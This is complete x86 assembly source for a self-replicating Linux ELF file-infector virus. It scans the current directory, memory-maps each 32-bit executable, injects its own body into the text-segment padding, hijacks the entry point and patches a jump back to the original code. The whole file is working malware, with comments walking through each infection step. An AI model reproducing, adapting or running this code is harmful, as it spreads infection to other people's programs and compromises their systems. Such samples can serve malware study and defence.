.section .text
_vstart:
    call vstart_addr

.globl main
main:
    # print the infect message
    mov $4, %eax
    mov $0, %ebx
    # push the string 'infect\0' onto the stack in hex in reverse order
    pushl $0x000a7463 
    pushl $0x65666e69
    # use stack pointer as string address to write
    mov %esp, %ecx
    mov $7, %edx
    int $0x80

    # open current directory for file scan
    mov $5, %eax
    pushw $0x002e  # hex encoded '.'
    mov %esp, %ebx
    xor %ecx, %ecx
    movb $2, %dl
    int $0x80

    # space on stack for local vars (24 on stack + 12)
    # dirent, dirfd, diroff, hostfd, hostsz, mmap addr, vstart, vend and vlen
    sub $24, %esp
    # directory fd
    mov %eax, 4(%esp)
    # initialise dirent offset
    movl $0, 8(%esp)

    # allocate heap space for dirent
    movb $45, %al   
    xor %ebx, %ebx
    int $0x80
    addw $300, %ax
    xchg %eax, %ebx
    movb $45, %al
    int $0x80
    # addr on heap for dirent
    sub $300, %eax  
    mov %eax, (%esp)

filescan:
    # getdents
    mov $141, %eax
    mov 4(%esp), %ebx
    mov (%esp), %ecx
    mov $300, %edx
    int $0x80

    # no valid files left
    cmp $0, %eax
    jle exit

dirents:
    # dirent addr+offset
    mov (%esp), %ebx
    add 8(%esp), %ebx

    # no more dirent structs
    cmpw $0, 8(%ebx)
    je filescan
    # next dirent struct
    movw 8(%ebx), %ax
    addw %ax, 8(%esp)

openfile:
    # open file
    mov $5, %eax
    # filename in dirent
    add $10, %ebx
    # r/w mode
    mov $2, %ecx
    xor %edx, %edx
    int $0x80
    cmpb $0, %al
    jl dirents

    # mmap host
    call mmap
    # save fd for close
    mov %ebx, 12(%esp)
    # save filesz for unmap
    mov %ecx, 16(%esp)
    cmp $-1, %eax
    je exit

    # save addr
    mov %eax, 20(%esp)

    # use the jmp trick to get the virus length
    jmp _vstart

vstart_addr:
    pop %edi
    # account for the call instruction
    sub $5, %edi
    mov %edi, 24(%esp)
    jmp _vend

vend_addr:
    pop %esi
    mov %esi, 28(%esp)
    # virus len
    mov %esi, 32(%esp)
    sub %edi, 32(%esp)

    # check host is an elf exe with enough padding
    mov 32(%esp), %edi
    call isinfectable
    # padding offset
    cmp $0, %ebx
    je unmap

    # infect the host
    mov 24(%esp), %edi
    mov 28(%esp), %esi
    call infect

unmap:
    # msync
    mov 20(%esp), %ebx  # addr
    mov 16(%esp), %ecx  # len
    mov $4, %edx
    mov $144, %eax
    int $0x80

    # file size
    mov 16(%esp), %ecx
    mov 20(%esp), %ebx
    mov $91, %eax
    int $0x80

close_file:
    # closefile
    mov $6, %eax
    mov 12(%esp), %ebx
    int $0x80
    jmp dirents

exit:
    mov $6, %eax
    mov 4(%esp), %ebx
    int $0x80

    # clean up for the host
    add $36, %esp
    xor %eax, %eax
    xor %ebx, %ebx
    xor %ecx, %ecx
    xor %edx, %edx
    xor %edi, %edi
    xor %esi, %esi

    # only exit when the virus has not infected 
    # a host otherwise the exit call is patched 
    # to jump to host entry point
    movb $1, %al
    xor %ebx, %ebx
    int $0x80
    # space for patch point
    nop; nop; nop; nop; nop

mmap:
    # arguments:
    #  eax: fd to host
    # return:
    #  eax: 0 on fail mapped address on success
    #  ebx: fd to host
    #  ecx: file size

    push %eax
    # allocate space for stat struct
    mov $45, %eax   
    xor %ebx, %ebx
    int $0x80
    add $88, %eax
    xchg %eax, %ebx
    movb $45, %al 
    int $0x80
    sub $88, %eax
    mov %eax, %esi

    push %eax

    # find file size
    mov $108, %eax
    mov 4(%esp), %ebx

    # space for struct
    mov (%esp), %ecx
    int $0x80
    cmp $0, %eax
    jl mmap_fail

    # file size for lseek and mmap
    mov %ecx, %edx
    mov 20(%edx), %ecx
    # make sure file is not empty
    cmp $0, %ecx
    jle mmap_fail

    # lseek to end
    mov $19, %eax
    mov $2, %edx
    int $0x80
    cmp $0, %eax
    jl mmap_fail

    # mmap host 
    mov $192, %eax
    # fd
    mov %ebx, %edi
    xor %ebx, %ebx
    sub $0x1, %ecx
    mov $0x3, %edx
    mov $0x1, %esi
    xor %ebp, %ebp
    int $0x80
    cmp $-1, %eax
    je mmap_fail
    jmp mmap_succ

mmap_fail:
    mov $-1, %eax

mmap_succ:
    mov %edi, %ebx
    add $8, %esp
    ret

find_tphdr:
    # arguments
    #  eax: pointer mmap file
    # return
    #  ebx: pointer to text phdr (0 on fail)
    #  ecx: number of remaining phdrs

    # number of phdrs
    xor %ecx, %ecx
    movw 44(%eax), %cx
    # goto phdr
    mov %eax, %esi
    add 28(%eax), %esi

read_phdr:
    # no more phdrs remain
    cmpw $0, %cx
    jle tphdr_fail
    subw $1, %cx

    # check p_type is loadable
    cmpb $1, (%esi)
    jne next_phdr

    # offset = 0 normally text segment
    cmp $0, 4(%esi)
    jne next_phdr

    # finally check it is r_x mode
    cmp $5, 24(%esi)
    jne next_phdr
    jmp tphdr_succ

next_phdr:
    # increment by phensize in the ehdr
    addw 42(%eax), %si
    jmp read_phdr

tphdr_fail:
    xor %ebx, %ebx
    ret

tphdr_succ:
    mov %esi, %ebx
    ret

isinfectable:
    # arguments
    #  eax: memory location of mapped file
    # return
    #  eax: memory of mapping file
    #  ebx: offset into file of text 
    #       section padding (0 if fail)
    #  edi: virus length

    # check file for elf magic number
    cmpl $0x464c457f, (%eax)
    jne notinfectable

    # check e_type for executable flag so we 
    # don't infect object files and libraries
    cmpw $2, 16(%eax)
    jne notinfectable

    # check e_machine type is intel 386
    cmpw $3, 18(%eax)
    jne notinfectable

    # check elf version is current
    cmp $1, 20(%eax)
    jne notinfectable

    # add phdr offset to mmap address
    mov %eax, %esi
    add 28(%eax), %esi 
    # no phdrs
    cmp $0, 28(%eax)
    je notinfectable

    call find_tphdr
    cmp $0, %ecx
    je notinfectable

    # determine space at the end of the
    # text segment using vaddr and filesz
    mov 8(%ebx), %ecx   
    add 16(%ebx), %ecx
    mov $4095, %edx     
    and %ecx, %edx
    mov $4096, %ecx
    sub %edx, %ecx     

    # check padding will fit virus
    cmp %edi, %ecx
    jle notinfectable

    # use p_offset and p_filesz to calc
    # offset to text section padding
    xor %ecx, %ecx
    addw 4(%ebx), %cx   
    addw 16(%ebx), %cx  
    mov %ecx, %ebx
    mov 8(%esi), %ecx
    ret

notinfectable:
    xor %ebx, %ebx
    ret

infect:
    # arguments: 
    #  eax contains ptr to mmap memory host
    #  ebx offset to padding in host
    #  edi and esi are start and end addr
    # local variable space
    mov %esp, %ebp
    sub $32, %esp

    # virus end addr
    mov %esi, (%esp)
    # virus start addr
    mov %edi, 4(%esp)
    #  virus length
    mov %esi, 8(%esp)
    sub %edi, 8(%esp)
    # mmap addr
    mov %eax, 12(%esp)
    # location of padding in host
    mov %ebx, 20(%esp)
    add %ebx, %eax
    mov %eax, 16(%esp)

    # virus end
    mov %esi, %ecx
    # virus start
    mov %edi, %ebx

copy_body:
    movl (%ebx), %edx
    movl %edx, (%eax)
    add $4, %ebx
    add $4, %eax
    cmp %ebx, %ecx
    jle patch_ep
    jmp copy_body

patch_ep:
    # new entry point
    mov 20(%esp), %ebx
    add $0x08048000, %ebx
    # account for jmp trick call
    add $0x5, %ebx
    # save host entry point
    mov 24(%ebp), %edx
    mov 24(%edx), %ecx
    # overwrite host entry point
    mov %ebx, 24(%edx)
    mov 16(%esp), %ebx

find_patch_point:
    # find host jmp patch point
    cmpl $0xf631ff31, (%ebx)
    jne next_patch_point
    cmpl $0xdb3101b0, 4(%ebx)
    jne next_patch_point
    jmp patch_host_ep

next_patch_point:
    add $1, %ebx
    jmp find_patch_point

patch_host_ep:
    add $8, %ebx
    # patch virus to jump to 
    # original entry point
    movb $0xbd, %dl
    movb %dl, (%ebx)
    movl %ecx, 1(%ebx)
    movw $0xe5ff, %dx
    movw %dx, 5(%ebx)

    # update filesz and memsz
    mov 12(%esp), %eax
    call find_tphdr
    cmp $0, %ebx

end_tphdr:
    je end_infect
    mov 8(%esp), %edx
    # update and save memsz/filesz
    add %edx, 16(%ebx)
    add %edx, 20(%ebx)

end_infect:
    mov %ebp, %esp
    ret

_vend:
    call vend_addr
